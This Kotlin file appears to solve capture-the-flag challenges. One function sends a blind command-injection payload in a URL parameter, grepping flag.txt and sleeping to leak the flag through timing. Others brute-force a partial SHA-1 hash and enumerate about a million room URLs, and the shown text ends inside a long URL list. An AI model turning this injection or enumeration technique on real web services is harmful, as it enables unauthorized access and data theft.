package com.ggstudios.tools.datafixer

import io.reactivex.Observable
import io.reactivex.schedulers.Schedulers
import sun.nio.ch.ThreadPool
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import java.util.*
import java.util.concurrent.CountDownLatch
import kotlin.experimental.and
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import io.reactivex.disposables.Disposable
import java.io.DataOutputStream


object Ctf {
    fun do1() {
        var curFlag = "flag.0r_M4yb3_z3r0_b17s"
        while (true) {
            println("Start guessing. CurFlag: $curFlag")
            val cdl = CountDownLatch(1)
            val prevFlag = curFlag
            val list = mutableListOf<Char>()
            for (i in 'a'..'z') {
                list.add(i)
            }
            for (i in 'A'..'Z') {
                list.add(i)
            }
            for (i in '0'..'9') {
                list.add(i)
            }
            list.add('_')
            list.add('@')
            list.add('!')
            list.add('?')
            fun getUrl(flag: String): String {
                return "http://squeakycleancodefinale.cybernetic.fish/new-ideas?idea=%22;%20if%20grep%20-q%20${flag}%20flag.txt;%20then%20sleep%20100;%20fi;%20echo%20%22"
            }
            val b = Observable.create<Char> {
                for (c in list) {
                    it.onNext(c)
                }
                it.onComplete()
            }.flatMap {
                Observable.create<Void> { emitter ->
                    try {
                        val url = getUrl(curFlag + it)
                        getHTML(url)
                        println("Not $it. Url: $url")
                    } catch (e: Exception) {
                        if (emitter.isDisposed) return@create
                        curFlag += it
                        println("New flag $curFlag.")
                    }
//                    if (getHTML(url).contains("true")) {
//                        if (emitter.isDisposed) return@create
//                        curFlag += it
//                        println("New flag $curFlag.")
//                    } else {
//                        println("Not $it.")
//                    }
                    emitter.onComplete()
                }.subscribeOn(Schedulers.io())
            }.subscribeOn(Schedulers.io())
                    .subscribe({}, {
                        cdl.countDown()
                    }, {
                        cdl.countDown()
                    })
            cdl.await()
            if (prevFlag == curFlag) {
                println("Guess failed. Exiting...")
                break;
            }
        }
    }
    private val hexArray = "0123456789ABCDEF".toCharArray()
    fun bytesToHex(bytes: ByteArray): String {
        val hexChars = CharArray(bytes.size * 2)
        for (j in bytes.indices) {
            val v = bytes[j].toInt() and 0xFF
            hexChars[j * 2] = hexArray[v ushr 4]
            hexChars[j * 2 + 1] = hexArray[v and 0x0F]
        }
        return String(hexChars)
    }
    fun do2() {
        println("Working...")
        fun toByteArray(i: Long) = byteArrayOf(
                (i shr 20 and 0xff).toByte(),
                (i shr 12 and 0xff).toByte(),
                (i shr 4 and 0xff).toByte(),
                (i * 16 and 0xff).toByte())
        val lookingFor = toByteArray(0xbf94ace)
        val cdl = CountDownLatch(1)
        val searchSpace = mutableListOf('.','?',';','!','@','#','$','%','^','&','*','(',')','{','}','/')
        for (i in '0'..'9') searchSpace.add(i)
        for (i in 'a'..'z') searchSpace.add(i)
        for (i in 'A'..'Z') searchSpace.add(i)
        val md = try {
            MessageDigest.getInstance("SHA-1")
        } catch (e: NoSuchAlgorithmException) {
            throw e
        }
        md.digest(byteArrayOf(0x43, 0x3C, 0x29, 0xA6.toByte()))
        println("Looking for ${bytesToHex(lookingFor)} or 0x${lookingFor[3].toString(16)} 0x${lookingFor[2].toString(16)} 0x${lookingFor[1].toString(16)} 0x${lookingFor[0].toString(16)}")
        val x = Observable.create<List<Char>> {
            val numChunks = 8
            val chunkSize = searchSpace.size / numChunks
            for (i in 0 until numChunks) {
                if (i + 1 == numChunks) {
                    it.onNext(searchSpace.subList(i * chunkSize, searchSpace.size))
                } else {
                    it.onNext(searchSpace.subList(i * chunkSize, (i + 1) * chunkSize))
                }
            }
            it.onComplete()
        }.flatMap { prefixRange ->
            Observable.create<Void> { emitter ->
                val md = try {
                    MessageDigest.getInstance("SHA-1")
                } catch (e: NoSuchAlgorithmException) {
                    throw e
                }
                val maxLen = 10
                var tryCount = 0
                val toTry = LinkedList<String>()
                toTry.addAll(prefixRange.map { it.toString() })
                fun check(i: String) {
                    tryCount++
                    if (tryCount % 100000 == 0) {
                        println("${Thread.currentThread().name} Try $tryCount. Cur: $i")
                    }
                    val resHash = md.digest(i.toByteArray())
                    if (resHash[0] == lookingFor[0]
                            && resHash[1] == lookingFor[1]
                            && resHash[2] == lookingFor[2]
                            && (resHash[3] and 0xf0.toByte()) == (lookingFor[3] and 0xf0.toByte())) {
                        println("Found: ${i} ($resHash)")
                        cdl.countDown()
                        return
                    }
                    if (i.length == maxLen) return
                    val ss = if (i.length == 0) prefixRange else searchSpace
                    for (c in ss) {
                        check(i + c)
                    }
                }
                check("")
                emitter.onComplete()
            }.subscribeOn(Schedulers.computation())
        }.subscribeOn(Schedulers.io())
                .subscribe({}, {
                    println("error")
                    cdl.countDown()
                }, {
                    println("done")
                    cdl.countDown()
                })
        cdl.await()
    }
    @Throws(Exception::class)
    fun getHTML(urlToRead: String): String {
        val result = StringBuilder()
        val url = URL(urlToRead)
        val conn = url.openConnection() as HttpURLConnection
        conn.setRequestMethod("GET")
        val rd = BufferedReader(InputStreamReader(conn.getInputStream()))
        var line: String?
        while (true) {
            line = rd.readLine()
            if (line == null) break
            result.append(line)
        }
        rd.close()
        return result.toString()
    }
    fun getHTMLWithRetry(url: String): String {
        while(true) {
            try {
                return getHTML(url)
            } catch (e: Exception) {
                System.err.println("Error loading $url. Retrying")
            }
        }
    }
    /**
     * Return map from user to message
     */
    fun parseHtml(html: String): List<Pair<String, String>> {
        var h = html
        val result = mutableListOf<Pair<String, String>>()
        while (true) {
            val start = h.indexOf("card-text")
            if (start == -1) break
            h = h.substring(start + 14)
            val userEnd = h.indexOf("<")
            val user = h.substring(0, userEnd)
            val message = h.substring(userEnd + 5, h.indexOf("span>") - 2)
            //println("$user - $message")
            result.add(user to message)
        }
        return result
    }

    fun do3() {
        fun getUrl(a: Int, b: Int, c: Int): String {
            return String.format("http://definitelynotzoom.cybernetic.fish/room/%02d-%02d-%02d", a, b, c)
        }
//        val html = getHTML(getUrl(40, 0, 49))
//        println(parseHtml(html))
        val messages = mutableSetOf<String>()
        val users = mutableSetOf<String>()
        val cdl = CountDownLatch(1)
        val total = 100*100*100
        var curProgress = 0
        val b = Observable.create<List<List<Int>>> {
            val threads = 100
            val chunkSize = 100 / threads
            for (c in 0 until threads) {
                val start = c * chunkSize
                val end = if (c == threads - 1) 100 else (c + 1) * chunkSize
                val m = mutableListOf<Int>()
                for (i in start until end) {
                    m.add(i)
                }
                val m2 = mutableListOf<Int>()
                for (i in 0..99) {
                    m2.add(i)
                }
                val m3 = mutableListOf<Int>()
                for (i in 0..99) {
                    m3.add(i)
                }
                it.onNext(listOf(m, m2, m3))
            }
            it.onComplete()
        }.flatMap {
            Observable.create<Void> { emitter ->
                val sb = StringBuilder()
                for (i in it[0]) {
                    for (j in it[1]) {
                        for (k in it[2]) {
                            val url = getUrl(i, j, k)
                            val html = getHTMLWithRetry(url)
//                            if (html.contains("card-text")) {
//                                println("Something interesting at $url")
//                            }

//                            parseHtml(html).forEach {
//                                if (users.add(it.first)) {
//                                    println("Use user! ${it.first}")
//                                }
//                                if (messages.add(it.second)) {
//                                    println("Use message! ${it.second}")
//                                }
//                            }
//                            if (!html.contains(String.format("Room %02d-%02d-%02d", i, j, k))) {
//                                println("Oh yessssss ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~! $url")
//                            }
                            if (html.contains("enter password", ignoreCase = true)) {
                                println("$url")
                            }
                            curProgress++
                            if (curProgress % 500 == 0) {
                                //println("Progress: ${curProgress.toFloat() / total * 100f}")
                            }
                        }
                    }
                }
                emitter.onComplete()
            }.subscribeOn(Schedulers.io())
        }.subscribeOn(Schedulers.io())
                .subscribe({}, {
                    it.printStackTrace()
                    cdl.countDown()
                }, {
                    cdl.countDown()
                })
        cdl.await()
    }
    
    fun do4() {
        val toVisit = listOf(
        "http://definitelynotzoom.cybernetic.fish/room/00-00-03",//
        "http://definitelynotzoom.cybernetic.fish/room/29-00-19",//
        "http://definitelynotzoom.cybernetic.fish/room/58-00-35",//
        "http://definitelynotzoom.cybernetic.fish/room/15-00-46",//
        "http://definitelynotzoom.cybernetic.fish/room/72-00-08",//
        "http://definitelynotzoom.cybernetic.fish/room/87-00-51",//
        "http://definitelynotzoom.cybernetic.fish/room/30-00-89",//
        "http://definitelynotzoom.cybernetic.fish/room/59-01-05",//
        "http://definitelynotzoom.cybernetic.fish/room/74-01-48",//
        "http://definitelynotzoom.cybernetic.fish/room/31-01-59",//
        "http://definitelynotzoom.cybernetic.fish/room/02-01-43",//err
        "http://definitelynotzoom.cybernetic.fish/room/60-01-75",//
        "http://definitelynotzoom.cybernetic.fish/room/89-01-91",//
        "http://definitelynotzoom.cybernetic.fish/room/17-01-86",//
        "http://definitelynotzoom.cybernetic.fish/room/46-02-02",//
        "http://definitelynotzoom.cybernetic.fish/room/03-02-13",//
        "http://definitelynotzoom.cybernetic.fish/room/75-02-18",//
        "http://definitelynotzoom.cybernetic.fish/room/32-02-29",//err
        "http://definitelynotzoom.cybernetic.fish/room/61-02-45",//
        "http://definitelynotzoom.cybernetic.fish/room/18-02-56",//
        "http://definitelynotzoom.cybernetic.fish/room/90-02-61",//
        "http://definitelynotzoom.cybernetic.fish/room/47-02-72",//
        "http://definitelynotzoom.cybernetic.fish/room/33-02-99",//
        "http://definitelynotzoom.cybernetic.fish/room/76-02-88",//err
        "http://definitelynotzoom.cybernetic.fish/room/62-03-15",//
        "http://definitelynotzoom.cybernetic.fish/room/77-03-58",//
        "http://definitelynotzoom.cybernetic.fish/room/05-03-53",//
        "http://definitelynotzoom.cybernetic.fish/room/34-03-69",//
        "http://definitelynotzoom.cybernetic.fish/room/20-03-96",//
        "http://definitelynotzoom.cybernetic.fish/room/06-04-23",//
        "http://definitelynotzoom.cybernetic.fish/room/49-04-12",//
        "http://definitelynotzoom.cybernetic.fish/room/78-04-28",//
        "http://definitelynotzoom.cybernetic.fish/room/64-04-55",//err
        "http://definitelynotzoom.cybernetic.fish/room/35-04-39",//
        "http://definitelynotzoom.cybernetic.fish/room/21-04-66",//
        "http://definitelynotzoom.cybernetic.fish/room/93-04-71",//err
        "http://definitelynotzoom.cybernetic.fish/room/50-04-82",//
        "http://definitelynotzoom.cybernetic.fish/room/79-04-98",//
        "http://definitelynotzoom.cybernetic.fish/room/36-05-09",
        "http://definitelynotzoom.cybernetic.fish/room/65-05-25",
        "http://definitelynotzoom.cybernetic.fish/room/08-05-63",
        "http://definitelynotzoom.cybernetic.fish/room/80-05-68",
        "http://definitelynotzoom.cybernetic.fish/room/37-05-79",
        "http://definitelynotzoom.cybernetic.fish/room/52-06-22",
        "http://definitelynotzoom.cybernetic.fish/room/09-06-33",
        "http://definitelynotzoom.cybernetic.fish/room/23-06-06",
        "http://definitelynotzoom.cybernetic.fish/room/67-06-65",
        "http://definitelynotzoom.cybernetic.fish/room/38-06-49",
        "http://definitelynotzoom.cybernetic.fish/room/96-06-81",
        "http://definitelynotzoom.cybernetic.fish/room/24-06-76",
        "http://definitelynotzoom.cybernetic.fish/room/53-06-92",
        "http://definitelynotzoom.cybernetic.fish/room/81-06-38",
        "http://definitelynotzoom.cybernetic.fish/room/39-07-19",
        "http://definitelynotzoom.cybernetic.fish/room/82-07-08",
        "http://definitelynotzoom.cybernetic.fish/room/68-07-35",
        "http://definitelynotzoom.cybernetic.fish/room/83-07-78",
        "http://definitelynotzoom.cybernetic.fish/room/11-07-73",
        "http://definitelynotzoom.cybernetic.fish/room/40-07-89",
        "http://definitelynotzoom.cybernetic.fish/room/12-08-43",
        "http://definitelynotzoom.cybernetic.fish/room/84-08-48",
        "http://definitelynotzoom.cybernetic.fish/room/55-08-32",
        "http://definitelynotzoom.cybernetic.fish/room/70-08-75",
        "http://definitelynotzoom.cybernetic.fish/room/41-08-59",
        "http://definitelynotzoom.cybernetic.fish/room/99-08-91",
        "http://definitelynotzoom.cybernetic.fish/room/56-09-02",
        "http://definitelynotzoom.cybernetic.fish/room/27-08-86",
        "http://definitelynotzoom.cybernetic.fish/room/85-09-18",
        "http://definitelynotzoom.cybernetic.fish/room/13-09-13",
        "http://definitelynotzoom.cybernetic.fish/room/71-09-45",
        "http://definitelynotzoom.cybernetic.fish/room/42-09-29",
        "http://definitelynotzoom.cybernetic.fish/room/14-09-83",
        "http://definitelynotzoom.cybernetic.fish/room/43-09-99",
        "http://definitelynotzoom.cybernetic.fish/room/86-09-88",
        "http://definitelynotzoom.cybernetic.fish/room/44-10-69",
        "http://definitelynotzoom.cybernetic.fish/room/58-10-42",
        "http://definitelynotzoom.cybernetic.fish/room/87-10-58",
        "http://definitelynotzoom.cybernetic.fish/room/01-10-80",
        "http://definitelynotzoom.cybernetic.fish/room/15-10-53",
        "http://definitelynotzoom.cybernetic.fish/room/30-10-96",
        "http://definitelynotzoom.cybernetic.fish/room/88-11-28",
        "http://definitelynotzoom.cybernetic.fish/room/59-11-12",
        "http://definitelynotzoom.cybernetic.fish/room/45-11-39",
        "http://definitelynotzoom.cybernetic.fish/room/73-10-85",
        "http://definitelynotzoom.cybernetic.fish/room/16-11-23",
        "http://definitelynotzoom.cybernetic.fish/room/74-11-55",
        "http://definitelynotzoom.cybernetic.fish/room/02-11-50",
        "http://definitelynotzoom.cybernetic.fish/room/46-12-09",
        "http://definitelynotzoom.cybernetic.fish/room/17-11-93",
        "http://definitelynotzoom.cybernetic.fish/room/89-11-98",
        "http://definitelynotzoom.cybernetic.fish/room/61-12-52",
        "http://definitelynotzoom.cybernetic.fish/room/33-13-06",
        "http://definitelynotzoom.cybernetic.fish/room/47-12-79",
        "http://definitelynotzoom.cybernetic.fish/room/18-12-63",
        "http://definitelynotzoom.cybernetic.fish/room/90-12-68",
        "http://definitelynotzoom.cybernetic.fish/room/62-13-22",
        "http://definitelynotzoom.cybernetic.fish/room/76-12-95",
        "http://definitelynotzoom.cybernetic.fish/room/04-12-90",
        "http://definitelynotzoom.cybernetic.fish/room/19-13-33",
        "http://definitelynotzoom.cybernetic.fish/room/91-13-38",
        "http://definitelynotzoom.cybernetic.fish/room/77-13-65",
        "http://definitelynotzoom.cybernetic.fish/room/05-13-60",
        "http://definitelynotzoom.cybernetic.fish/room/48-13-49",
        "http://definitelynotzoom.cybernetic.fish/room/34-13-76",
        "http://definitelynotzoom.cybernetic.fish/room/20-14-03",
        "http://definitelynotzoom.cybernetic.fish/room/63-13-92",
        "http://definitelynotzoom.cybernetic.fish/room/49-14-19",
        "http://definitelynotzoom.cybernetic.fish/room/92-14-08",
        "http://definitelynotzoom.cybernetic.fish/room/64-14-62",
        "http://definitelynotzoom.cybernetic.fish/room/21-14-73",
        "http://definitelynotzoom.cybernetic.fish/room/93-14-78",
        "http://definitelynotzoom.cybernetic.fish/room/36-15-16",
        "http://definitelynotzoom.cybernetic.fish/room/65-15-32",
        "http://definitelynotzoom.cybernetic.fish/room/94-15-48",
        "http://definitelynotzoom.cybernetic.fish/room/07-15-00",
        "http://definitelynotzoom.cybernetic.fish/room/51-15-59",
        "http://definitelynotzoom.cybernetic.fish/room/22-15-43",
        "http://definitelynotzoom.cybernetic.fish/room/08-15-70",
        "http://definitelynotzoom.cybernetic.fish/room/80-15-75",
        "http://definitelynotzoom.cybernetic.fish/room/66-16-02",
        "http://definitelynotzoom.cybernetic.fish/room/52-16-29",
        "http://definitelynotzoom.cybernetic.fish/room/95-16-18",
        "http://definitelynotzoom.cybernetic.fish/room/37-15-86",
        "http://definitelynotzoom.cybernetic.fish/room/67-16-72",
        "http://definitelynotzoom.cybernetic.fish/room/96-16-88",
        "http://definitelynotzoom.cybernetic.fish/room/23-16-13",
        "http://definitelynotzoom.cybernetic.fish/room/24-16-83",
        "http://definitelynotzoom.cybernetic.fish/room/39-17-26",
        "http://definitelynotzoom.cybernetic.fish/room/10-17-10",
        "http://definitelynotzoom.cybernetic.fish/room/68-17-42",
        "http://definitelynotzoom.cybernetic.fish/room/83-17-85",
        "http://definitelynotzoom.cybernetic.fish/room/25-17-53",
        "http://definitelynotzoom.cybernetic.fish/room/11-17-80",
        "http://definitelynotzoom.cybernetic.fish/room/54-17-69",
        "http://definitelynotzoom.cybernetic.fish/room/97-17-58",
        "http://definitelynotzoom.cybernetic.fish/room/26-18-23",
        "http://definitelynotzoom.cybernetic.fish/room/40-17-96",
        "http://definitelynotzoom.cybernetic.fish/room/69-18-12",
        "http://definitelynotzoom.cybernetic.fish/room/98-18-28",
        "http://definitelynotzoom.cybernetic.fish/room/55-18-39",
        "http://definitelynotzoom.cybernetic.fish/room/70-18-82",
        "http://definitelynotzoom.cybernetic.fish/room/99-18-98",
        "http://definitelynotzoom.cybernetic.fish/room/27-18-93",
        "http://definitelynotzoom.cybernetic.fish/room/71-19-52",
        "http://definitelynotzoom.cybernetic.fish/room/42-19-36",
        "http://definitelynotzoom.cybernetic.fish/room/14-19-90",
        "http://definitelynotzoom.cybernetic.fish/room/57-19-79",
        "http://definitelynotzoom.cybernetic.fish/room/28-19-63",
        "http://definitelynotzoom.cybernetic.fish/room/43-20-06",
        "http://definitelynotzoom.cybernetic.fish/room/86-19-95",
        "http://definitelynotzoom.cybernetic.fish/room/00-20-17",
        "http://definitelynotzoom.cybernetic.fish/room/29-20-33",
        "http://definitelynotzoom.cybernetic.fish/room/72-20-22",
        "http://definitelynotzoom.cybernetic.fish/room/58-20-49",
        "http://definitelynotzoom.cybernetic.fish/room/01-20-87",
        "http://definitelynotzoom.cybernetic.fish/room/87-20-65",
        "http://definitelynotzoom.cybernetic.fish/room/30-21-03",
        "http://definitelynotzoom.cybernetic.fish/room/45-21-46",
        "http://definitelynotzoom.cybernetic.fish/room/31-21-73",
        "http://definitelynotzoom.cybernetic.fish/room/73-20-92",
        "http://definitelynotzoom.cybernetic.fish/room/74-21-62",
        "http://definitelynotzoom.cybernetic.fish/room/02-21-57",
        "http://definitelynotzoom.cybernetic.fish/room/46-22-16",
        "http://definitelynotzoom.cybernetic.fish/room/03-22-27",
        "http://definitelynotzoom.cybernetic.fish/room/89-22-05",
        "http://definitelynotzoom.cybernetic.fish/room/17-22-00",
        "http://definitelynotzoom.cybernetic.fish/room/60-21-89",
        "http://definitelynotzoom.cybernetic.fish/room/32-22-43",
        "http://definitelynotzoom.cybernetic.fish/room/61-22-59",
        "http://definitelynotzoom.cybernetic.fish/room/33-23-13",
        "http://definitelynotzoom.cybernetic.fish/room/75-22-32",
        "http://definitelynotzoom.cybernetic.fish/room/90-22-75",
        "http://definitelynotzoom.cybernetic.fish/room/77-23-72",
        "http://definitelynotzoom.cybernetic.fish/room/76-23-02",
        "http://definitelynotzoom.cybernetic.fish/room/04-22-97",
        "http://definitelynotzoom.cybernetic.fish/room/05-23-67",
        "http://definitelynotzoom.cybernetic.fish/room/48-23-56",
        "http://definitelynotzoom.cybernetic.fish/room/34-23-83",
        "http://definitelynotzoom.cybernetic.fish/room/20-24-10",
        "http://definitelynotzoom.cybernetic.fish/room/63-23-99",
        "http://definitelynotzoom.cybernetic.fish/room/06-24-37",
        "http://definitelynotzoom.cybernetic.fish/room/49-24-26",
        "http://definitelynotzoom.cybernetic.fish/room/64-24-69",
        "http://definitelynotzoom.cybernetic.fish/room/78-24-42",
        "http://definitelynotzoom.cybernetic.fish/room/92-24-15",
        "http://definitelynotzoom.cybernetic.fish/room/35-24-53",
        "http://definitelynotzoom.cybernetic.fish/room/36-25-23",
        "http://definitelynotzoom.cybernetic.fish/room/93-24-85",
        "http://definitelynotzoom.cybernetic.fish/room/50-24-96",
        "http://definitelynotzoom.cybernetic.fish/room/21-24-80",
        "http://definitelynotzoom.cybernetic.fish/room/07-25-07",
        "http://definitelynotzoom.cybernetic.fish/room/79-25-12",
        "http://definitelynotzoom.cybernetic.fish/room/51-25-66",
        "http://definitelynotzoom.cybernetic.fish/room/08-25-77",
        "http://definitelynotzoom.cybernetic.fish/room/52-26-36",
        "http://definitelynotzoom.cybernetic.fish/room/80-25-82",
        "http://definitelynotzoom.cybernetic.fish/room/95-26-25",
        "http://definitelynotzoom.cybernetic.fish/room/09-26-47",
        "http://definitelynotzoom.cybernetic.fish/room/96-26-95",
        "http://definitelynotzoom.cybernetic.fish/room/67-26-79",
        "http://definitelynotzoom.cybernetic.fish/room/38-26-63",
        "http://definitelynotzoom.cybernetic.fish/room/24-26-90",
        "http://definitelynotzoom.cybernetic.fish/room/81-26-52",
        "http://definitelynotzoom.cybernetic.fish/room/53-27-06",
        "http://definitelynotzoom.cybernetic.fish/room/10-27-17",
        "http://definitelynotzoom.cybernetic.fish/room/39-27-33",
        "http://definitelynotzoom.cybernetic.fish/room/23-26-20",
        "http://definitelynotzoom.cybernetic.fish/room/82-27-22",
        "http://definitelynotzoom.cybernetic.fish/room/83-27-92",
        "http://definitelynotzoom.cybernetic.fish/room/11-27-87",
        "http://definitelynotzoom.cybernetic.fish/room/54-27-76",
        "http://definitelynotzoom.cybernetic.fish/room/26-28-30",
        "http://definitelynotzoom.cybernetic.fish/room/12-28-57",
        "http://definitelynotzoom.cybernetic.fish/room/55-28-46",
        "http://definitelynotzoom.cybernetic.fish/room/84-28-62",
        "http://definitelynotzoom.cybernetic.fish/room/70-28-89",
        "http://definitelynotzoom.cybernetic.fish/room/98-28-35",
        "http://definitelynotzoom.cybernetic.fish/room/56-29-16",
        "http://definitelynotzoom.cybernetic.fish/room/41-28-73",
        "http://definitelynotzoom.cybernetic.fish/room/99-29-05",
        "http://definitelynotzoom.cybernetic.fish/room/27-29-00",
        "http://definitelynotzoom.cybernetic.fish/room/42-29-43",
        "http://definitelynotzoom.cybernetic.fish/room/13-29-27",
        "http://definitelynotzoom.cybernetic.fish/room/85-29-32",
        "http://definitelynotzoom.cybernetic.fish/room/57-29-86",
        "http://definitelynotzoom.cybernetic.fish/room/14-29-97",
        "http://definitelynotzoom.cybernetic.fish/room/86-30-02",
        "http://definitelynotzoom.cybernetic.fish/room/58-30-56",
        "http://definitelynotzoom.cybernetic.fish/room/44-30-83",
        "http://definitelynotzoom.cybernetic.fish/room/29-30-40",
        "http://definitelynotzoom.cybernetic.fish/room/15-30-67",
        "http://definitelynotzoom.cybernetic.fish/room/30-31-10",
        "http://definitelynotzoom.cybernetic.fish/room/88-31-42",
        "http://definitelynotzoom.cybernetic.fish/room/16-31-37",
        "http://definitelynotzoom.cybernetic.fish/room/01-30-94",
        "http://definitelynotzoom.cybernetic.fish/room/45-31-53",
        "http://definitelynotzoom.cybernetic.fish/room/59-31-26",
        "http://definitelynotzoom.cybernetic.fish/room/73-30-99",
        "http://definitelynotzoom.cybernetic.fish/room/74-31-69",
        "http://definitelynotzoom.cybernetic.fish/room/60-31-96",
        "http://definitelynotzoom.cybernetic.fish/room/32-32-50",
        "http://definitelynotzoom.cybernetic.fish/room/17-32-07",
        "http://definitelynotzoom.cybernetic.fish/room/89-32-12",
        "http://definitelynotzoom.cybernetic.fish/room/33-33-20",
        "http://definitelynotzoom.cybernetic.fish/room/61-32-66",
        "http://definitelynotzoom.cybernetic.fish/room/47-32-93",
        "http://definitelynotzoom.cybernetic.fish/room/18-32-77",
        "http://definitelynotzoom.cybernetic.fish/room/62-33-36",
        "http://definitelynotzoom.cybernetic.fish/room/91-33-52",
        "http://definitelynotzoom.cybernetic.fish/room/77-33-79",
        "http://definitelynotzoom.cybernetic.fish/room/76-33-09",
        "http://definitelynotzoom.cybernetic.fish/room/19-33-47",
        "http://definitelynotzoom.cybernetic.fish/room/04-33-04",
        "http://definitelynotzoom.cybernetic.fish/room/48-33-63",
        "http://definitelynotzoom.cybernetic.fish/room/20-34-17",
        "http://definitelynotzoom.cybernetic.fish/room/63-34-06",
        "http://definitelynotzoom.cybernetic.fish/room/64-34-76",
        "http://definitelynotzoom.cybernetic.fish/room/92-34-22",
        "http://definitelynotzoom.cybernetic.fish/room/36-35-30",
        "http://definitelynotzoom.cybernetic.fish/room/21-34-87",
        "http://definitelynotzoom.cybernetic.fish/room/35-34-60",
        "http://definitelynotzoom.cybernetic.fish/room/50-35-03",
        "http://definitelynotzoom.cybernetic.fish/room/94-35-62",
        "http://definitelynotzoom.cybernetic.fish/room/65-35-46",
        "http://definitelynotzoom.cybernetic.fish/room/07-35-14",
        "http://definitelynotzoom.cybernetic.fish/room/51-35-73",
        "http://definitelynotzoom.cybernetic.fish/room/79-35-19",
        "http://definitelynotzoom.cybernetic.fish/room/66-36-16",
        "http://definitelynotzoom.cybernetic.fish/room/22-35-57",
        "http://definitelynotzoom.cybernetic.fish/room/08-35-84",
        "http://definitelynotzoom.cybernetic.fish/room/95-36-32",
        "http://definitelynotzoom.cybernetic.fish/room/80-35-89",
        "http://definitelynotzoom.cybernetic.fish/room/37-36-00",
        "http://definitelynotzoom.cybernetic.fish/room/67-36-86",
        "http://definitelynotzoom.cybernetic.fish/room/38-36-70",
        "http://definitelynotzoom.cybernetic.fish/room/10-37-24",
        "http://definitelynotzoom.cybernetic.fish/room/39-37-40",
        "http://definitelynotzoom.cybernetic.fish/room/23-36-27",
        "http://definitelynotzoom.cybernetic.fish/room/82-37-29",
        "http://definitelynotzoom.cybernetic.fish/room/25-37-67",
        "http://definitelynotzoom.cybernetic.fish/room/68-37-56",
        "http://definitelynotzoom.cybernetic.fish/room/11-37-94",
        "http://definitelynotzoom.cybernetic.fish/room/83-37-99",
        "http://definitelynotzoom.cybernetic.fish/room/40-38-10",
        "http://definitelynotzoom.cybernetic.fish/room/98-37-61",
        "http://definitelynotzoom.cybernetic.fish/room/54-37-83",
        "http://definitelynotzoom.cybernetic.fish/room/69-38-26",
        "http://definitelynotzoom.cybernetic.fish/room/26-38-37",
        "http://definitelynotzoom.cybernetic.fish/room/97-37-72",
        "http://definitelynotzoom.cybernetic.fish/room/70-38-96",
        "http://definitelynotzoom.cybernetic.fish/room/98-38-42",
        "http://definitelynotzoom.cybernetic.fish/room/41-38-80",
        "http://definitelynotzoom.cybernetic.fish/room/42-39-50",
        "http://definitelynotzoom.cybernetic.fish/room/13-39-34",
        "http://definitelynotzoom.cybernetic.fish/room/85-39-39",
        "http://definitelynotzoom.cybernetic.fish/room/71-39-66",
        "http://definitelynotzoom.cybernetic.fish/room/28-39-77",
        "http://definitelynotzoom.cybernetic.fish/room/57-39-93",
        "http://definitelynotzoom.cybernetic.fish/room/43-40-20",
        "http://definitelynotzoom.cybernetic.fish/room/86-40-09",
        "http://definitelynotzoom.cybernetic.fish/room/72-40-36",
        "http://definitelynotzoom.cybernetic.fish/room/44-40-90",
        "http://definitelynotzoom.cybernetic.fish/room/14-40-04",
        "http://definitelynotzoom.cybernetic.fish/room/29-40-47",
        "http://definitelynotzoom.cybernetic.fish/room/00-40-31",
        "http://definitelynotzoom.cybernetic.fish/room/88-41-49",
        "http://definitelynotzoom.cybernetic.fish/room/16-41-44",
        "http://definitelynotzoom.cybernetic.fish/room/45-41-60",
        "http://definitelynotzoom.cybernetic.fish/room/01-41-01",
        "http://definitelynotzoom.cybernetic.fish/room/31-41-87",
        "http://definitelynotzoom.cybernetic.fish/room/73-41-06",
        "http://definitelynotzoom.cybernetic.fish/room/02-41-71",
        "http://definitelynotzoom.cybernetic.fish/room/46-42-30",
        "http://definitelynotzoom.cybernetic.fish/room/60-42-03",
        "http://definitelynotzoom.cybernetic.fish/room/89-42-19",
        "http://definitelynotzoom.cybernetic.fish/room/17-42-14",
        "http://definitelynotzoom.cybernetic.fish/room/32-42-57",
        "http://definitelynotzoom.cybernetic.fish/room/61-42-73",
        "http://definitelynotzoom.cybernetic.fish/room/03-42-41",
        "http://definitelynotzoom.cybernetic.fish/room/47-43-00",
        "http://definitelynotzoom.cybernetic.fish/room/75-42-46",
        "http://definitelynotzoom.cybernetic.fish/room/91-43-59",
        "http://definitelynotzoom.cybernetic.fish/room/76-43-16",
        "http://definitelynotzoom.cybernetic.fish/room/19-43-54",
        "http://definitelynotzoom.cybernetic.fish/room/90-42-89",
        "http://definitelynotzoom.cybernetic.fish/room/04-43-11",
        "http://definitelynotzoom.cybernetic.fish/room/48-43-70",
        "http://definitelynotzoom.cybernetic.fish/room/05-43-81",
        "http://definitelynotzoom.cybernetic.fish/room/34-43-97",
        "http://definitelynotzoom.cybernetic.fish/room/63-44-13",
        "http://definitelynotzoom.cybernetic.fish/room/20-44-24",
        "http://definitelynotzoom.cybernetic.fish/room/64-44-83",
        "http://definitelynotzoom.cybernetic.fish/room/92-44-29",
        "http://definitelynotzoom.cybernetic.fish/room/49-44-40",
        "http://definitelynotzoom.cybernetic.fish/room/06-44-51",
        "http://definitelynotzoom.cybernetic.fish/room/93-44-99",
        "http://definitelynotzoom.cybernetic.fish/room/35-44-67",
        "http://definitelynotzoom.cybernetic.fish/room/78-44-56",
        "http://definitelynotzoom.cybernetic.fish/room/50-45-10",
        "http://definitelynotzoom.cybernetic.fish/room/94-45-69",
        "http://definitelynotzoom.cybernetic.fish/room/79-45-26",
        "http://definitelynotzoom.cybernetic.fish/room/07-45-21",
        "http://definitelynotzoom.cybernetic.fish/room/51-45-80",
        "http://definitelynotzoom.cybernetic.fish/room/22-45-64",
        "http://definitelynotzoom.cybernetic.fish/room/52-46-50",
        "http://definitelynotzoom.cybernetic.fish/room/66-46-23",
        "http://definitelynotzoom.cybernetic.fish/room/08-45-91",
        "http://definitelynotzoom.cybernetic.fish/room/95-46-39",
        "http://definitelynotzoom.cybernetic.fish/room/09-46-61",
        "http://definitelynotzoom.cybernetic.fish/room/37-46-07",
        "http://definitelynotzoom.cybernetic.fish/room/67-46-93",
        "http://definitelynotzoom.cybernetic.fish/room/24-47-04",
        "http://definitelynotzoom.cybernetic.fish/room/38-46-77",
        "http://definitelynotzoom.cybernetic.fish/room/10-47-31",
        "http://definitelynotzoom.cybernetic.fish/room/81-46-66",
        "http://definitelynotzoom.cybernetic.fish/room/96-47-09",
        "http://definitelynotzoom.cybernetic.fish/room/53-47-20",
